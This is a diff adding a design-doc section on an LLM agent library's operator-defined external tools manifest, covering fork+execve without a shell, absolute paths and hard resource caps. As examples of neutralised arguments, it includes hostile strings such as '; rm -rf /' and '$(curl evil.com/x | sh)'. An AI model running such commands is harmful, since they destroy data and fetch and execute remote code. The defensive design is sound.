@@ -522,6 +522,188 @@ field — keeping it in the headers means OpenAI-compat client SDKs
 that don't know about easyai pass through cleanly without trying to
 forward the field to the model.
 
+## 5f. External tools — operator-defined commands via JSON manifest
+
+Lives in `src/external_tools.cpp` (the implementation) and
+`include/easyai/external_tools.hpp` (the public API). User-facing
+documentation: `manual.md` §3.3.4 (reference) and §3.3.5 (recipes /
+corner cases / best practices). Security review: `SECURITY_AUDIT.md`
+§16. This section describes *why* the subsystem is shaped the way
+it is.
+
+### The trust boundary
+
+Built-in tools (`datetime`, `web_search`, `fs_*`, `bash`, …) are C++
+code we wrote and reviewed. Adding a new built-in is a code change,
+goes through review, ships in a binary release. That's the right
+process for tools that the agent's *author* controls.
+
+But there's a different need: the agent's *operator* — the person
+running easyai-server in a specific environment — wants the model
+to be able to run *their* CLIs (`/opt/internal/bin/deploy-cli`,
+`/usr/local/bin/our-jq-wrapper`, an internal Python script). Today
+their only options are:
+
+1. **Hard-code the tool in C++** — needs a fork of easyai. Bad
+   ergonomics, ties them to our release cadence.
+2. **Expose `bash`** — gives the model a `system()` equivalent.
+   No safety nets the operator can pre-declare.
+3. **Wrap each command in a sidecar HTTP service** — heavyweight,
+   adds another component to monitor.
+
+The manifest is the missing fourth option. It's a YAML/sudoers
+shape: a per-deploy artefact owned by the operator, declaring
+exactly which commands the model is allowed to dispatch, what
+arguments each takes, and the resource caps. The model fills in
+parameter values; the operator picks the surface area.
+
+> **Trust direction:** the manifest is a *deploy artefact*, not a
+> chat artefact. It's written by humans, code-reviewed, version-
+> controlled, and shipped alongside the binary. The model never
+> writes it; the model only consumes the surface it exposes.
+
+### Why fork+execve (no shell)
+
+The dispatch path is `fork()` + `execve(absolute_path, argv, envp)`.
+There is no `/bin/sh -c …` anywhere. Consequences:
+
+- A model argument that contains `; rm -rf /` is one argv element,
+  not a command separator.
+- A model argument that contains `$(curl evil.com/x | sh)` is one
+  argv element, not a substitution.
+- A model argument that contains backticks, redirects, glob
+  metacharacters, or `&&` is one argv element. None of those
+  characters are special outside a shell.
+
+This is a structural guarantee, not a "we sanitised the inputs"
+guarantee. Sanitisation is a moving target; structural absence of
+a parser is permanent. The same reason `subprocess.run([..],
+shell=False)` is safer than `shell=True` in Python — we just refuse
+to even *expose* the unsafe shape.
+
+The cost: pipes, redirects, `&&`, globbing — none of those work
+without an explicit shell tool. Operators who need them keep using
+the `bash` builtin (which is honest about being unsafe). The
+manifest is for the 90% that doesn't need a shell.
+
+### Why absolute paths only (no PATH lookup)
+
+`command` MUST start with `/`. Consequences:
+
+- No PATH-hijack: an attacker who can write `~/.local/bin/uname`
+  can't trick the agent into running their `uname` instead of
+  `/usr/bin/uname`.
+- No "works in dev, breaks in prod when PATH differs."
+- Manifest is portable across environments only insofar as the
+  operator chose to make it so (different distros = different
+  paths; the operator picks one and owns the deploy).
+
+`PATH` *can* be passed through via `env_passthrough` for tools that
+internally `exec` other binaries (git invokes git-log, …), but the
+top-level command is locked.
+
+### Why whole-element placeholders only
+
+Argv templates accept `"{name}"` as a complete element, never
+embedded (`"--flag={x}"` is rejected at load). Two reasons:
+
+1. **Quoting fragility.** If we allowed embedded placeholders, an
+   operator would write `["--filter={query}"]` and assume the
+   library handles quoting. But there's nothing to quote — it's
+   already an argv element. The first time someone tries
+   `query = "a b c"` they'd get a passing test; the first time
+   someone tries `query = '";rm -rf"'` they'd discover that
+   argv-element interpolation has no escaping rules. We refuse to
+   build a "safe" interpolator that's actually a footgun.
+
+2. **Invariant simplicity.** "The model's value fills exactly one
+   argv slot" is provable by inspection. "The model's value is
+   substituted at position k of element j" is not — depends on
+   surrounding literals, on whether `j` ends with a quote, on
+   whether the wrapped command parses `--flag=` differently from
+   `--flag `.
+
+Operators who need both literal and dynamic content split the
+element: `["--flag", "{x}"]`. The wrapped binary almost always
+accepts the split form (it's the standard GNU/POSIX shape).
+
+### Why the hard caps
+
+Every numeric cap closes a class of attack:
+
+| Cap | Value | What it stops |
+| --- | --- | --- |
+| `kMaxManifestBytes` | 1 MiB | Pathological-JSON DoS at parse time. |
+| `kMaxToolsPerManifest` | 128 | Reflective-add: model spending its prompt budget enumerating tools. |
+| `kMaxParamsPerTool` | 32 | Schema-validator quadratic blowup. |
+| `kMaxArgvElements` | 256 | argv overflow / kernel `ARG_MAX` exhaustion. |
+| `kMaxArgElementBytes` | 4 KiB | Single overlong argv string. |
+| `kMaxEnvPassthrough` | 16 | Env table size; also bounds per-call envp build cost. |
+| `kTimeoutMin / Max` | 100 ms / 5 min | Floor: a 0-timeout would race; ceiling: agent-loop deadlock prevention. |
+| `kOutputCapMin / Max` | 1 KiB / 4 MiB | Floor: enough to fit any sensible response; ceiling: per-call RAM bound. |
+| `kMaxFdScan` | 65 536 | Bounds the `close()` loop in the child between `fork` and `execve` so `RLIMIT_NOFILE = RLIM_INFINITY` doesn't either leak fds (cast wraps to `-1`) or stall exec by closing 1 M+ fds. |
+
+The caps are deliberately tight — "cannot conceivably be needed by a
+legitimate manifest, can plausibly be tried by a hostile one."
+Loosen with a written reason or not at all.
+
+### Why `get_current_dir` and the startup chdir
+
+The model has no implicit awareness of where it is on disk. With
+`fs_*` tools rooted at `/` (a virtualised view, not the real /),
+the model thinks it's in a clean filesystem starting from /; with
+`bash`, the model thinks it's in some shell. Both are abstractions
+over the *operator's chosen sandbox directory*.
+
+Without `get_current_dir`, the model has to either:
+
+- Assume relative paths work (fragile — depends on the operator's
+  invocation), or
+- Call `bash pwd` (works but burns a tool call to learn one path).
+
+`easyai::tools::get_current_dir()` is the explicit answer. The
+CLIs `chdir(--sandbox)` at startup, the tool returns `getcwd()`,
+the model has a single source of truth for "where am I". The
+external-tools manifest's `cwd: "$SANDBOX"` resolves to the same
+directory at load time — every fs-flavoured surface (built-in or
+operator-declared) agrees on what "here" means.
+
+The Toolbelt registers `get_current_dir` automatically when any
+fs-tool is enabled (`--allow-fs` or `--allow-bash`); it's free
+context the model needs to do useful work.
+
+### Where this fits in the four-tier API rule (§1b)
+
+| Tier | Audience | Surface |
+| --- | --- | --- |
+| 1 — façade | beginner | `easyai::Agent a("model.gguf")` — no manifest, builtins only. |
+| 2 — fluent | intermediate | `a.allow_bash().sandbox("/srv/x")` — opt into sharper tools. |
+| 3 — operator | deployment | `--tools-json /etc/easyai/tools.json` — declare your own surface. *This subsystem.* |
+| 4 — escape hatch | extension | `Tool::builder().handle(...)` in C++ — in-process tool with shared state. |
+
+Tier 3 is intentionally not in C++. Operators who can write a JSON
+file but not C++ are still production users; their threat model is
+deserving of the same fork+execve hardening that the C++ Toolbelt
+gets. The manifest is the operator surface for "I have a binary,
+let the model use it" without leaving JSON.
+
+### What the subsystem does NOT do
+
+- **No isolation.** The subprocess runs with the agent's full
+  uid/gid. We close inheritance leaks (fds, env), bound resource
+  use (timeout, output, RAM), and remove the shell as an attack
+  surface — but we do not ship a chroot, namespace, or seccomp
+  policy. For deployments needing isolation, run easyai-server
+  inside a container / firejail / unprivileged user.
+- **No retry / supervisor.** Each call is a one-shot fork+exec.
+  Crashes are reported as `exit=signal:N`; the agent decides
+  whether to retry.
+- **No log rotation.** Per-call output is captured into RAM and
+  returned to the model. We do not write to disk.
+
+These are deliberate non-goals — adding any of them would expand
+the trust surface in ways the operator didn't sign up for.
+
 ---
 
 ## 6. The HTTP server
